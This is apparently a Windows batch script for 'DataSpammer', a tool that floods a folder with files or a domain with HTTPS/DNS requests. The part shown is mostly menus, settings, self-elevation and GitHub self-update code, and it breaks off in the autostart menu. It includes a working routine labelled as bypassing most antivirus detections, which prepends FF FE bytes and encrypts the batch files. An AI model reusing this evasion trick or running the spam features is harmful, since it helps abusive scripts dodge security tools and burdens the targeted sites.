:: Use only under MIT License
:: Use only under License
::    Todo: 
::    Fix SSH
::    Add Translation
::    Fix Logging Date (1838)

:: Developer Notes:
:: Define %debug_asist% to bypass echo_off
:: Define devtools to open useless dev menu (needs improvements)
:: Dev Tool is in install.bat   :sys.add.developer.tool


:!top
    cd %~dp0
    set "script.dir=%cd%"
    @if "%debug_assist%"=="" @echo off
    if "%OS%"=="Windows_NT" setlocal
    set DIRNAME=%~dp0
    if "%DIRNAME%"=="" set DIRNAME=.
    mode con: cols=140 lines=40
    set "current-script-version=v4.1"
    if "%1"=="h" goto help.startup
    if "%1"=="-h" goto help.startup
    if "%1"=="help" goto help.startup
    if "%1"=="-help" goto help.startup
    if "%1"=="--help" goto help.startup
    if "%1"=="faststart" goto sys.enable.ascii.tweak
    if "%1"=="update" goto fast.git.update
    if "%1"=="remove" goto sys.delete.script
    if "%1"=="" goto normal.start
    if "%1"=="cli" goto sys.cli
    if "%1"=="debug" goto debuglog
    if "%1"=="debugtest" goto debugtest
    if "%1"=="api" goto sys.api
    if "%1"=="goto" goto dev.goto
    if "%1"=="noelev" @ECHO OFF && cd /d %~dp0 && @color 02 && set "small-install=1" && goto check-files
    if "%update-install%"=="1" ( goto sys.new.update.installed )



:normal.start
    @color 02
    cd /d %~dp0
    if not defined devtools (goto top-startup) else (gotod open.dev.settings)


:top-startup
    set inputFile=settings.conf
    set "firstLine="
    set /p firstLine=<%inputFile%
    if "%firstLine%"=="small-install" (
        set "small-install=1" 
        set "small-install=1" && goto sys.enable.ascii.tweak
    ) else (
        goto sys.req.elevation
    )

:sys.req.elevation
    :: Parses Settings
    echo Checking for Data...
    if not exist "settings.conf" goto sys.no.settings
    echo Extracting Settings...
    set "config_file=settings.conf"
    for /f "usebackq tokens=1,2 delims==" %%a in (`findstr /v "^::" "%config_file%"`) do (
        set "%%a=%%b"
    )

    net session >nul 2>&1
    if %errorLevel% neq 0 (
        if "%elevation%"=="sudo" goto sudo.elevation
        if "%elevation%"=="gsudo" goto gsudo.elevation
        powershell -Command "Start-Process '%~f0' -Verb runAs"
        exit
    )
    cd /d %~dp0
    goto check-files
    
:sudo.elevation
    net session >nul 2>&1
    if %errorLevel% neq 0 ( 
        for /f "delims=" %%A in ('where sudo') do set SUDO_PATH=%%A
        %SUDO_PATH% cmd.exe -k %~f0
        exit
    )
    cd /d %~dp0
    goto check-files

:gsudo.elevation
    net session >nul 2>&1
    if %errorLevel% neq 0 ( 
        for /f "delims=" %%A in ('where gsudo') do set GSUDO_PATH=%%A
        %GSUDO_PATH% cmd.exe -k %~f0
        exit
    )
    cd /d %~dp0
    goto check-files

:check-files
    :: Checks if all Files needed for the Script exist
    setlocal enabledelayedexpansion
    @title Starting Up...
    :: Makes Log More Readable after Script restart
    if %logging% == 1 ( call :log . )
    if %logging% == 1 ( call :log . )
    if %logging% == 1 ( call :log . )
    if %logging% == 1 ( call :log . )
    if %logging% == 1 ( call :log DataSpammer_Started )

    echo Checking for Files...
    if not exist "install.bat" (goto sys.error.no.install) else (goto settings.extract.update)

:sys.no.settings
    if %logging% == 1 ( call :log Settings-Not-Found )
    :: TLI when Settings arent found
    cls
    echo The File "settings.conf" doesnt exist. 
    call :sys.lt 1
    echo Theres a high Chance that the Installer didnt run yet.
    call :sys.lt 1
    echo Please consider rerunning the installer to make sure the script can run accurately.
    call :sys.lt 1
    echo Do you want to reinstall the Script or do you want to open the Script anyways?
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [1] Open the Installer
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Open the Script anyways 
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto sys.open.installer
        if %_erl%==2 goto no.settings.update
    goto sys.no.settings


:no.settings.update
    if %logging% == 1 ( call :log Checking-Update-No-Settings )
    call :gitcall.sys
    set "small-install=1"
    goto sys.enable.ascii.tweak


:settings.extract.update
    if %logging% == 1 ( call :log Checking_Settings_for_Update_Command )
    if "%logging%"=="1" call :gitcall.sys
    goto dts.startup.done

:gitcall.sys
    if %logging% == 1 ( call :log Calling_Update_Check )
    call :git.version.check
    call :git.update.check %uptodate%
    exit /b

:git.version.check
    if %logging% == 1 ( call :log Curling_Github_API )
    echo Checking for Updates...
    set "owner=PIRANY1"
    set "repo=DataSpammer"
    set "api_url=https://api.github.com/repos/%owner%/%repo%/releases/latest"
    echo Getting Latest Release Info from API...
    curl -s %api_url% > apianswer.txt
    echo Got Release Info...
    echo Awaiting Response...
    echo Recieved API Response...
    echo Extracting Data...
    @ping -n 2 localhost> nul
    for /f "tokens=2 delims=:, " %%a in ('findstr /R /C:"\"tag_name\"" apianswer.txt') do (
        set "latest_version=%%a"
    )
    set "latest_version=%latest_version:"=%"


    
    if "%latest_version%" equ "v4324.1" (
        set "uptodate=up"
    ) else (
        set "uptodate="
    )
    del apianswer.txt
    exit /b
    
:git.update.check
    if %logging% == 1 ( call :log Extracting_Data_From_API )
    if "%1"=="up" (
        call :git.version.clean
    ) else (
        call :git.version.outdated
    )
    exit /b

:git.version.outdated
    if %logging% == 1 ( call :log Version_Outdated )
    echo Version Outdated!
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo Please consider downloading the new Version. 
    call :sys.lt 1
    echo The Version you are currently using is %current-script-version%
    call :sys.lt 1call :sys.lt 1 
    echo The newest Version avaiable is %latest_version%
    call :sys.lt 1
    echo.
    echo [1] Update
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Continue Anyways
    call :sys.lt 1
    echo.
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto git.update.version
        if %_erl%==2 exit /b
    goto git.version.outdated




:git.version.clean
    if %logging% == 1 ( call :log Version_Is_Up_To_Date )
    echo The Version you are currently using is the newest one (%latest_version%)
    call :sys.lt 1
    exit /b


:git.update.version
    cls
    :: Updated in v4.2
    :: Old one used seperate file / wget & curl
    if %logging% == 1 ( call :log Creating_Update_Script )
    cd /d %~dp0
    erase install.bat && erase README.md && erase LICENSE >nul 2>&1
    mkdir %temp%\dts.update >nul 2>&1
    echo Updating script... 
    powershell iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat" -OutFile "%temp%\dts.update\%~nx0" >nul 2>&1
    cls && echo Updating DataSpammer.bat...
    powershell iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/install.bat" -OutFile "%temp%\dts.update\install.bat" >nul 2>&1
    cls && echo Updating Install.bat...
    powershell iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/README.md" -OutFile "%temp%\dts.update\README.md" >nul 2>&1
    cls && echo Updating Readme...
    powershell iwr "https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/LICENSE" -OutFile "%temp%\dts.update\LICENSE" >nul 2>&1
    cls && echo Updating License...
    echo Updated successfully.
    move /y "%temp%\dts.update\*" "%~dp0"
    cmd.exe -k %~f0
    goto :EOF
    exit


:sys.error.no.install
    if %logging% == 1 ( call :log Install_Bat_Doesnt_Exist )
    :: TLI When the Installer doesnt exist
    echo The "Install.bat" doesnt exist. Some Features may not work.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [1] Open GitHub for Versions.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Continue Anyways
    call :sys.lt 1
    echo.
    call :sys.lt 1
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto git.open.repo
        if %_erl%==2 goto dts.startup.done
    goto sys.error.no.install


:git.open.repo
    if %logging% == 1 ( call :log Opening_Repo )
    :: Open Repo
    start "" "https://github.com/PIRANY1/DataSpammer"
    goto sys.error.no.install

:sys.open.installer
    if %logging% == 1 ( call :log Opening_Installer )
    :: Opens the Installer
    cd /d %~dp0
    install.bat
    if %errorlevel% equ 0 (cls | echo Installer is running....) else (echo There was an Error. Please open the install.bat File manually.)

:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: -------------------------------------------------Start.bat  <- Transition -> DataSpammer.bat------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:: --------------------------------------------------------------------------------------------------------------------------------------------------
:dts.startup.done
    if %logging% == 1 ( call :log Script_Was_Opened_From_Installer )
    :: If the Script got opened from installer?

:check-dev-options
   if %logging% == 1 ( call :log Checking_If_Developer_Mode_Is_Turned_On )
   cd /d %~dp0
   if "%developermode%"=="1" (set "dev-mode=1") else (set "dev-mode=0")
   if not defined devtools (goto sys.enable.ascii.tweak) else (goto dtd)

:sys.enable.ascii.tweak
    if %logging% == 1 ( call :log Sending_Notification )
    if %logging% == 1 ( call :log Enabling_ASCII_without_CHCP )
    powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'DataSpammer', 'Started DataSpammer', [System.Windows.Forms.ToolTipIcon]::None)}"
    :: Allows ASCII stuff without Codepage Settings (i use both to be sure)
    SETLOCAL EnableDelayedExpansion
    SET $Echo=FOR %%I IN (1 2) DO IF %%I==2 (SETLOCAL EnableDelayedExpansion ^& FOR %%A IN (^^^!Text:""^^^^^=^^^^^"^^^!) DO ENDLOCAL ^& ENDLOCAL ^& ECHO %%~A) ELSE SETLOCAL DisableDelayedExpansion ^& SET Text=
    SETLOCAL DisableDelayedExpansion

:menu
    if exist updater.bat erase updater.bat
    if exist encrypt.bat erase encrypt.bat
    if "%1"=="settings" goto settings
    if %logging% == 1 ( call :log Displaying_Menu )
    if %logging% == 1 ( call :log Startup_Complete )
    title DataSpammer v4.1
    if "%small-install%" == "1" (
        set "settings-lock=Locked. Find Information under [44mHelp[32m"
    ) else (
        set "settings-lock=Settings"
    )
    :: Main Menu TLI

    cls
    %$Echo% "   ____        _        ____                                           
    %$Echo% "  |  _ \  __ _| |_ __ _/ ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __
    %$Echo% "  | | | |/ _` | __/ _` \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
    %$Echo% "  | |_| | (_| | || (_| |___) | |_) | (_| | | | | | | | | | | |  __/ |  
    %$Echo% "  |____/ \__,_|\__\__,_|____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|  
    %$Echo% "                             |_|                                                                    



    call :sys.lt 1
    echo Made by PIRANY                 v4.1
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [1] Help
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Start
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [3] Cancel
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [4] Credits/Contact
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [5] %settings-lock%
    color 02
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [6] Autostart/Desktop Icon
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [7] Open GitHub-Repo
    echo.
    echo.
    choice /C 1234567 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto help
        if %_erl%==2 goto start
        if %_erl%==3 goto cancel
        if %_erl%==4 goto credits
        if %_erl%==5 goto settings
        if %_erl%==6 goto ad.settings
        if %_erl%==7 If %main.menu% == 7 start "" "https://github.com/PIRANY1/DataSpammer" | cls | goto menu
    goto menu


:check.lib.git.update
    if %logging% == 1 ( call :log Checking_For_Updates_from_Menu )
    goto :normal.start

:help
    :: TLI for Infos
    cls
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo No liability for any Damages on your Software.
    call :sys.lt 1
    echo If you want to use this Script on a Server you have to be able to write something in the Folder you want to use.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo When youre on a Small Install you cant access the "Locked." Tab because it needs different Variables in the settings.conf file. 
    call :sys.lt 1
    echo To use the Settings you need to reinstall the Script. Simply open the Github Repo via the Main Page and choose one of the download Options.
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo [1] Go back
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Exit
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [3] Exit
    call :sys.lt 1
    echo.
    call :sys.lt 1
    choice /C 123 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto menu
        if %_erl%==2 goto list.readme.license
        if %_erl%==3 goto cancel
    goto help


:list.readme.license
    echo License:
    :: List the Content of LICENSE
    set "liscensefad=%~dp0\LICENSE"
    
    if exist "%liscensefad%" (
        for /f "tokens=*" %%a in (%liscensefad%) do (
            echo %%a
        )
    ) else (
        goto list.content.RD
    )
    goto list.content.RD

:list.content.RD
    :: List the Content of readme
    set "liscensefad1=%~dp0\README.md"
    
    if exist "%liscensefad1%" (
        for /f "tokens=*" %%a in (%liscensefad1%) do (
            echo %%a
        )
    )
    pause
    goto help
    


:credits
    :: TLI Code for Credits
    cls 
    echo.
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo This Script is made by PIRANY for Educational Use only.
    call :sys.lt 1
    echo The whole Code is made by PIRANY  
    call :sys.lt 1
    echo If you found any Bugs/Glitches or have a Problem With this software please Create a Issue on the Github-Repo
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo [1] Go back
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Open the Github-Repo
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [3] Exit
    call :sys.lt 1
    echo.
    call :sys.lt 1
    choice /C 123 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto menu
        if %_erl%==2 goto cancel
        if %_erl%==3 start "" "https://github.com/PIRANY1/DataSpammer" | cls | goto credits
    goto credits

:settings
    if %logging% == 1 ( call :log Opened_Settings_%dev-mode%_dev_mode)
    color
    if %dev-mode% == 1 set "settings-dev-display=Activated"
    if %dev-mode% == 0 set "settings-dev-display=Not Activated"
    :: TLI for Settings - Add Skip Security Question + Always use Custom Directory Yes/No
    cls 
    echo ========
    echo Settings
    echo ========
    echo.
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo [1] Spam Settings
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] [31mDeveloper Options (Currently %settings-dev-display%) [32m
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [3] Version Control
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [4] Logging
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [5] Restart Script
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [6] Advanced Options
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [7] Go back
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo.
    call :sys.lt 1

    choice /C 1234567 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto spam.settings
        if %_erl%==2 goto activate.dev.options
        if %_erl%==3 goto settings.version.control
        if %_erl%==4 goto settings.logging
        if %_erl%==5 goto restart.script
        if %_erl%==6 goto advanced.options
        if %_erl%==7 goto menu
    goto settings


:advanced.options
    echo [1] Switch Elevation Method (pswh / sudo / gsudo)
    call :sys.lt 1
    echo [2] Encrypt Files (Bypass most Antivirus detections)
    call :sys.lt 1
    echo [3] Generate Debug Log
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [4] Go back
    choice /C 1234 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto switch.elevation
        if %_erl%==2 goto encrypt
        if %_erl%==3 goto debuglog
        if %_erl%==4 goto settings
    goto advanced.options

    

:encrypt
    if %logging% == 1 ( call :log Encrypting_Script )
    echo Encrypting...
    call :sys.lt 1
    cd /d %~dp0 
    (
        @echo off
        cd /d %~dp0
        echo FF FE 0D 0A 63 6C 73 0D 0A > temp_hex.txt
        certutil -f -decodehex temp_hex.txt temp_prefix.bin
        move dataspammer.bat original_dataspammer.bat
        copy /b temp_prefix.bin + original_dataspammer.bat dataspammer.bat
        move install.bat original_install.bat
        copy /b temp_prefix.bin + original_install.bat install.bat
        erase original_install.bat
        erase original_dataspammer.bat
        erase temp_hex.txt
        erase temp_prefix.bin
        Cipher /E dataspammer.bat
        Cipher /E install.bat
        cd /d %~dp0
        start powershell -Command "Start-Process 'dataspammer.bat' -Verb runAs"
        erase encrypt.bat
    ) > encrypt.bat
     
    start powershell -Command "Start-Process 'encrypt.bat' -Verb runAs"




:switch.elevation
    echo What do you want to elevate Dataspammer.bat
    echo.
    echo [1] Powershell
    echo.
    echo [2] sudo (needs 24H2)
    echo.
    echo [3] gsudo (/gerardog/gsudo)
    echo.
    echo. 
    choice /C 123 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto switch.pwsh.elevation
        if %_erl%==2 goto switch.sudo.elevation
        if %_erl%==2 goto switch.gsudo.elevation
    goto switch.elevation


:switch.sudo.elevation
    for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"') do set "releaseid=%%a"
    for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentBuild"') do set "build=%%a"
    
    :: Version: %releaseid%
    :: Build-Number: %build%
    set /a min_build=25900
    if %build% geq %min_build% (
        :: Is 24H2 or higher
        goto where.sudo
    ) else (
        :: is lower than 24H2
        echo You dont have Version 24H2 && pause && goto advanced.options
    )
    
:where.sudo
    for /f "delims=" %%a in ('where sudo') do (
        set "where_output=%%a"
    )
    if not defined where_output (echo You dont have sudo enabled. && pause && goto advanced.options)

    if %logging% == 1 ( call :log Chaning_Elevation_to_sudo )
    call :update_config "elevation" "" "sudo"
    echo Switched to Sudo.
    @ping -n 2 localhost> nul
    goto restart.script


:switch.pwsh.elevation
    echo Switching to Powershell Elevation...
    @ping -n 2 localhost> nul
    if %logging% == 1 ( call :log Chaning_Elevation_to_pwsh )
    call :update_config "elevation" "" "pwsh"
    echo Switched to Powershell.
    @ping -n 2 localhost> nul
    goto restart.script

:switch.gsudo.elevation
    echo Switching to GSUDO Elevation...
    @ping -n 2 localhost> nul
    if %logging% == 1 ( call :log Chaning_Elevation_to_gsudo )
    call :update_config "elevation" "" "gsudo"
    echo Switched to GSudo.
    @ping -n 2 localhost> nul
    goto restart.script


:sudo.implementation
    :: Works, but PWSH is more reliable
    :: Windows will support sudo, starting in 24H2
    :: Check for Windows Version 24H2 or higher > where SUDO > start via sudo

    :: https://github.com/microsoft/sudo
    :: https://github.com/microsoft/sudo/blob/main/scripts/sudo.ps1

    :: Read Version from Registry
    for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"') do set "releaseid=%%a"
    for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentBuild"') do set "build=%%a"
    
    :: Version: %releaseid%
    :: Build-Number: %build%
    set /a min_build=25900
    if %build% geq %min_build% (
        :: Is 24H2 or higher
        set "sudo=1"
        goto where.sudo
    ) else (
        :: is lower than 24H2
        set "sudo=0"
        goto top-startup
    )
    
:where.sudo
    :: Check if sudo is defined in Path
    for /f "delims=" %%a in ('where sudo') do (
        set "where_output=%%a"
    )
    if defined where_output (
        goto sudo.parse
    ) else (
        set "sudo=0"
    )

:: Execute PWSH Elev
:: goto elevated

:sudo.parse
:: elevate via sudo
:: goto elevated


:spam.settings
    echo [1] Default Filename
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo [2] Default Directory
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo [3] Default Filecount / Request Count
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo [4] Default Domain (HTTPS/DNS)
    call :sys.lt 1
    echo. 
    call :sys.lt 1
    echo [5] Go back
    choice /C 12345 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto settings.default.filename
        if %_erl%==2 goto settings.default.directory
        if %_erl%==3 goto settings.default.filecount
        if %_erl%==4 goto settings.default.domain
        if %_erl%==5 goto settings
    goto spam.settings


:settings.default.filecount
    if %logging% == 1 ( call :log Chaning_Standart_Filecount )
    cls 
    set /p df.filecount=Enter the Default Filecount:
    call :update_config "default-filecount" "" "%df.filecount%"
    echo Restarting Script...
    @ping -n 2 localhost > nul
    goto restart.script

:settings.default.domain
    if %logging% == 1 ( call :log Chaning_Standart_Domain )
    cls 
    set /p df.domain=Enter the Default Domain:
    call :update_config "default-domain" "" "%df.domain%"
    echo Restarting Script...
    @ping -n 2 localhost > nul
    goto restart.script

:settings.version.control
    echo.
    echo.
    call :sys.lt 1
    echo [1] Force Update
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Switch to Main Branch
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [3] Switch to Developer Branch
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [4] Go Back
    call :sys.lt 1
    echo.
    echo.
    choice /C 1234 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto dev.force.update
        if %_erl%==2 goto stable.switch.branch
        if %_erl%==3 goto dev.switch.branch  
        if %_erl%==4 goto settings
    goto settings.version.control


:dev.force.update
    if %logging% == 1 ( call :log Switching_to_stable_branch )
    cd /d %~dp0
    echo @echo off > updater.bat
    echo cd /d %~dp0 >> updater.bat
    echo echo Updating script... >> updater.bat
    echo curl -sSLo dataspammer.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo curl -sSLo install.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/install.bat >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo curl -sSLo readme.md https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/readme.md >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo curl -sSLo license https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/license >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo set "update-install=1" >> updater.bat
    echo start powershell -Command "Start-Process 'dataspammer.bat' -Verb runAs" >> updater.bat
    echo exit >> updater.bat

    start powershell -Command "Start-Process 'updater.bat' -Verb runAs"
    exit



:dev.switch.branch
    if %logging% == 1 ( call :log Switching_to_Dev_Branch )
    cd /d %~dp0
    echo @echo off > updater.bat
    echo cd /d %~dp0 >> updater.bat
    echo echo Updating script... >> updater.bat
    echo curl -sSLo dataspammer.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/dataspammer.bat >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo curl -sSLo install.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/install.bat >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo curl -sSLo readme.md https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/readme.md >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo curl -sSLo license https://raw.githubusercontent.com/PIRANY1/DataSpammer/refs/heads/beta/license >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo set "update-install=1" >> updater.bat
    echo start powershell -Command "Start-Process 'dataspammer.bat' -Verb runAs" >> updater.bat
    echo exit >> updater.bat

    start powershell -Command "Start-Process 'updater.bat' -Verb runAs"
    exit /b

:stable.switch.branch
    if %logging% == 1 ( call :log Switching_to_stable_branch )
    cd /d %~dp0
    echo @echo off > updater.bat
    echo cd /d %~dp0 >> updater.bat
    echo echo Updating script... >> updater.bat
    echo curl -sSLo dataspammer.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/dataspammer.bat >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo curl -sSLo install.bat https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/install.bat >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo curl -sSLo readme.md https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/readme.md >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo curl -sSLo license https://raw.githubusercontent.com/PIRANY1/DataSpammer/main/license >> updater.bat
    echo if %%ERRORLEVEL%% neq 0 ( echo Download failed, aborting update ^&^& pause ^&^& exit ) >> updater.bat
    echo set "update-install=1" >> updater.bat
    echo start powershell -Command "Start-Process 'dataspammer.bat' -Verb runAs" >> updater.bat
    echo exit >> updater.bat

    start powershell -Command "Start-Process 'updater.bat' -Verb runAs"
    exit


:activate.dev.options   
    if %dev-mode% == 1 goto open.dev.settings
    echo Do you want to activate the Developer Options?
    echo Developer Options include Debugging, Logging and some extra Menus
    echo This can lead to some instabilty!
        choice /C YN /M "Yes/No"
        set _erl=%errorlevel%
        if %_erl%==Y goto write-dev-options
        if %_erl%==N goto settings
    
:open.dev.settings
    if %logging% == 1 ( call :log opening_dev_settings )
    goto dev.options
    
:write-dev-options
    if %logging% == 1 ( call :log Activating_Dev_Options )
    cd /d %~dp0
    call :update_config "developermode" "" "1"
    echo Developer Options have been activated!
    echo Script will now restart
    @ping -n 2 localhost> nul
    goto restart.script

:settings.default.filename
    :: Write Standart Filename to File
    cls 
    call :update_config "default-filename" "Type in the Filename you want to use:" ""
    echo Restarting Script...
    if %logging% == 1 ( call :log Changing_Standart_FileName )
    @ping -n 2 localhost > nul
    goto restart.script



:settings.default.directory
    if %logging% == 1 ( call :log Chaning_Standart_Directory )
    :: Standart Spam Directory Check
    cls 
    set /p directory0=Type Your Directory Here:
    call :update_config "default_directory" "" "%directory0%"
    echo Restarting Script...
    if %logging% == 1 ( call :log Changing_Default_Directory )
    @ping -n 2 localhost > nul
    goto restart.script

:settings.logging
    if %logging% == 1 ( call :log Opened_Logging_Settings )
    color 02
    cls
    if %logging% == 1 (
        set "settings.logging=Activated"
    ) else (
        set "settings.logging=Disabled"
    )
    echo Logging is currently: %settings.logging%
    echo.
    call :sys.lt 1
    echo [1] Activate Logging
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Disable Logging
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [3] Open Latest Log
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [4] Go Back
    call :sys.lt 1
    echo.
    echo.
    choice /C 1234 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto enable.logging
        if %_erl%==2 goto disable.logging
        if %_erl%==3 goto dev.open.log
        if %_erl%==4 goto settings
    goto settings.logging


:enable.logging
    if %logging% == 1 ( goto settings.logging )
    call :update_config "logging" "" "1"
    echo Enabled Logging. Restarting Script...
    @ping -n 2 localhost > nul
    goto restart.script

:dev.open.log
    echo Opening Log...
    notepad %userprofile%\Documents\DataSpammerLog\DataSpammer.log
    pause
    goto settings.logging

:disable.logging
    if %logging% == 0 ( goto settings.logging )
    if %logging% == 1 ( call :log Disabling_Logging )
    call :update_config "logging" "" "0"
    echo Disabled Logging. Restarting Script...
    @ping -n 2 localhost> nul
    goto restart.script

:ad.settings
    :: Autostart TLI
    echo.
    cls
    echo.
    echo =================================
    echo Autostart / Desktop Icon Settings
    echo =================================
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [1] Setup 
    echo.
    call :sys.lt 1
    echo.
    call :sys.lt 1
    echo [2] Delete Autostart
    echo.
    call :sys.lt 1
    echo [3] Back
    echo.
    echo.

    choice /C 123 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto ad.setup
        if %_erl%==2 goto ad.remove
        if %_erl%==3 goto menu
    goto ad.settings


    :ad.remove
    echo [1] Delete Autostart
    echo.
    call :sys.lt 1
    echo.
    echo [2] Delete Desktop Icon
    echo.
    call :sys.lt 1
    echo.
    echo [3] Back
    echo.
    echo.
    choice /C 123 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto autostart.delete
        if %_erl%==2 goto desktop.icon.delete  
        if %_erl%==3 goto ad.settings
    goto ad.remove


:ad.setup
    echo [1] Start Setup for Autostart
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [2] Start Setup for Desktop Icon
    @ping -n 1 localhost> nul
    echo.
    @ping -n 1 localhost> nul
    echo [3] Go Back
    @ping -n 1 localhost> nul
    echo.

    choice /C 123 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto autostart.setup.confirmed
